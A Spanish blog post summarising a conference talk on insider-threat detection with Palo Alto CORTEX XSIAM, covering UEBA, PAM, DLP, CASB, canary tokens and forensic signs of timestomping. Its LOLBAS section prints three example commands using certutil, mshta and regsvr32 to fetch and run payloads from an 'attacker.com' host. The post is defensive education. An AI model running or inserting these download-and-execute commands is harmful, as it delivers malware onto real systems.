---
layout: single
title: "EuskalHack IX — Insiders: detección de amenazas internas con CORTEX XSIAM"
date: 2026-06-20
permalink: /conference/euskalhack-ix-insiders-ueba/
excerpt: "Detección de insiders con Palo Alto CORTEX XSIAM: UEBA, timestomping, LNK/Jumplist, GraalVM abuse, PAM, DLP, CASB y Canary Tokens. Técnicas MITRE ATT&CK T1078/T1074."
categories: [conference]
tags: [euskalhack, euskalhack-ix, insider-threat, ueba, xdr, siem, palo-alto, dlp, forensics]
toc: true
toc_sticky: true
series: "EuskalHack IX"
---

> **TL;DR (EN):** Insider threat detection using Palo Alto CORTEX XSIAM. The three pillars: behavioral complexity (UEBA baseline), visibility (endpoints + network + identity), and identity federation. Key attacker techniques: GraalVM abuse, timestomping, LNK persistence. Defenses: PAM, DLP, CASB, Canary Tokens. Talk by Rubén Darío Castillo at EuskalHack IX, June 2026.

---

> **Ponente:** Rubén Darío Castillo · [Palo Alto Networks](https://www.paloaltonetworks.com) · X: [@Rubendcastillo](https://x.com/Rubendcastillo)  
> **Congreso:** [EuskalHack IX](/conference/euskalhack-ix/) · Donostia, 19 de junio de 2026 · ES

---

## Contexto: el problema del insider

El insider es el adversario más difícil de detectar porque:
- **Tiene acceso legítimo** — no necesita explotar vulnerabilidades de entrada
- **Conoce la organización** — sabe dónde están los datos valiosos
- **Sus acciones parecen normales** — el ruido y la señal se confunden

El 60% de los incidentes de datos involucran a un actor interno (empleado malicioso, negligente o comprometido).

---

## Plataforma: CORTEX XSIAM (Palo Alto Networks)

**CORTEX XSIAM** (Extended Security Intelligence and Automation Management) es la plataforma XDR/SIEM de próxima generación de Palo Alto Networks. Combina:
- Ingestión de datos de múltiples fuentes (endpoints, red, cloud, identidad)
- Correlación con IA/ML para detectar patrones anómalos
- Automatización de respuesta (SOAR integrado)
- **UEBA** nativo para análisis de comportamiento de usuarios y entidades

---

## Los tres pilares de la detección de insiders

```
┌─────────────────────────────────────────────────────────────┐
│ 1. COMPLEJIDAD   │ Comportamiento anómalo vs. baseline      │
│                  │ "¿Esto es normal para este usuario?"     │
├─────────────────────────────────────────────────────────────┤
│ 2. VISIBILIDAD   │ Endpoints + Red + Identidad centralizada │
│                  │ Sin visibilidad no hay detección         │
├─────────────────────────────────────────────────────────────┤
│ 3. IDENTIDAD     │ Quién hace qué y desde dónde            │
│                  │ MFA + Federation + PAM                  │
└─────────────────────────────────────────────────────────────┘
```

---

## Casos de referencia

- **VISA AI modelo** — ML para detección de fraude en tiempo real. UEBA aplicada a escala industrial.
- **Cobalt Strike** — framework C2 legítimo de red team, ampliamente abusado por actores maliciosos.
- **TruffleHog** (TruffleHog Security) — encuentra secretos (API keys, tokens) en repos git, incluyendo historial de commits.

---

## Robo de secretos desde marketplaces

Las extensiones de IDE y navegadores son un vector creciente:
- **VS Code Marketplace** — extensiones maliciosas con acceso completo al filesystem y variables de entorno
- **Firefox / Chrome Extensions** — acceso a cookies, localStorage, tráfico web
- **GitHub Secret Scanning** — funcionalidad nativa de GitHub para detectar secretos (API keys, tokens) expuestos en repos públicos, incluyendo historial de commits

---

## Gestión de secretos e identidad

### Identity Federation
Sistema que permite usar una identidad de un proveedor (SAML, OIDC, OAuth2) en múltiples servicios sin replicar credenciales. Riesgo: comprometer el IdP da acceso a todos los servicios federados.

### HSM (Hardware Security Module)
Dispositivo físico que genera, almacena y gestiona claves criptográficas. Las claves **nunca salen del HSM en claro**.

```
Vector de ataque:
HSM → [proceso de aplicación] → token en memoria → aplicación
                 ↑
         punto de intercepción del insider
```

---

## Técnicas de ataque insider / post-compromise

### GraalVM Abuse

**GraalVM** es el runtime polyglota de Oracle (Java, JS, Python en la misma JVM). Si un servicio legítimo corre en GraalVM, un atacante puede ejecutar código en otro lenguaje sin levantar alertas específicas de ese lenguaje.

### Timestomping

Modificar las marcas de tiempo de ficheros para ocultar cuándo fueron creados o modificados.

**Detección forense:**

```
$STANDARD_INFORMATION (visible, modificable por atacante)  ←── modifica esto
$FILE_NAME (en MFT, más difícil de modificar)              ←── forense compara esto

Si $STANDARD_INFORMATION ≠ $FILE_NAME → timestomping detectado
```

### LNK / Jumplist

- **Ficheros .lnk** — contienen ruta del ejecutable, argumentos, timestamps, MAC address, volumen. Artefactos forenses ricos incluso si se borra el fichero original.
- **Jump Lists** — historial de archivos recientes por aplicación en `%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\`

**Uso ofensivo:** persistencia (`.lnk` en carpeta de inicio que ejecuta un payload).  
**Uso forense:** reconstruir qué archivos accedió el insider y cuándo.

---

## Evidencia forense — historial del navegador

El historial se almacena en bases de datos SQLite (`History` en Chrome/Edge). Evidencia de exfiltración:
- Subidas a Google Drive / Mega / Dropbox personal
- Búsquedas sobre competidores o salidas de la empresa
- Accesos a herramientas de exfiltración (WeTransfer, Pastebin)

Recuperable incluso si el usuario lo borra, si se hace volcado forense antes de que se sobrescriba.

---

## Conceptos relacionados

### UEBA (User and Entity Behavior Analytics)

Establece una **baseline de comportamiento** por usuario y detecta anomalías estadísticas:
- Descarga de 50 GB a las 3 AM (lo normal son 100 MB en horario de trabajo)
- Acceso a 1000 documentos en una hora (staging antes de exfiltrar)
- Acceso a recursos nunca visitados antes de un período de salida inminente

UEBA no detecta el ataque concreto — detecta que algo es anormal.

### PAM (Privileged Access Management)

Soluciones como **CyberArk** o **BeyondTrust**:
- **Just-in-time access** — privilegios solo cuando se necesitan
- **Session recording** — toda la sesión privilegiada grabada
- **Credential vaulting** — el insider nunca ve la contraseña real

### DLP (Data Loss Prevention)

Monitoriza y bloquea exfiltración: bloquear subidas a Mega personal, alertar al copiar a USB, inspeccionar HTTPS outbound.

### CASB (Cloud Access Security Broker)

Detecta **Shadow IT**: el insider que usa su Dropbox personal para sacar datos porque la red bloquea Mega pero no Dropbox.

### LOLBAS (Living Off The Land Binaries and Scripts)

Binarios legítimos de Windows abusados para ejecutar código malicioso sin herramientas propias:

```powershell
# Descargar fichero con certutil (sin instalar nada)
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\payload.exe

# Ejecutar HTA remota con mshta
mshta.exe http://attacker.com/evil.hta

# Registrar DLL remota con regsvr32
regsvr32.exe /s /n /u /i:http://attacker.com/evil.sct scrobj.dll
```

### Canary Tokens

Señuelos que disparan alertas cuando son accedidos:
- **Fichero canario** — `Salarios 2026.xlsx` en carpeta de RRHH. Si alguien lo abre → alerta.
- **URL canaria** — enlace en documento. Si el documento sale de la empresa → revela destino.
- **Credential canary** — credenciales falsas en config. Si se usan → evidencia de acceso.

Implementación gratuita: [canarytokens.org](https://canarytokens.org)

### MITRE ATT&CK — Técnicas de insider más comunes

| Técnica | ID | Descripción |
|---------|-----|-------------|
| Valid Accounts | T1078 | Usar credenciales propias legítimas |
| Data Staged | T1074 | Copiar datos a una ubicación temporal antes de exfiltrar |
| Exfiltration over Alt. Protocol | T1048 | Exfiltrar via HTTPS personal, DNS |
| Timestomping | T1070.006 | Modificar timestamps para ocultar actividad |

### Zero Trust aplicado a insiders

"Never trust, always verify" — incluso usuarios internos deben autenticarse y estar autorizados para cada recurso:
- **Verificación continua** — no solo en el login, sino en cada acceso
- **Micro-segmentación** — acceso a RRHH no implica acceso a Finanzas
- **Asume compromiso** — la pregunta no es si alguien entrará, sino cuándo

---

*← [Volver al índice de EuskalHack IX](/conference/euskalhack-ix/)*
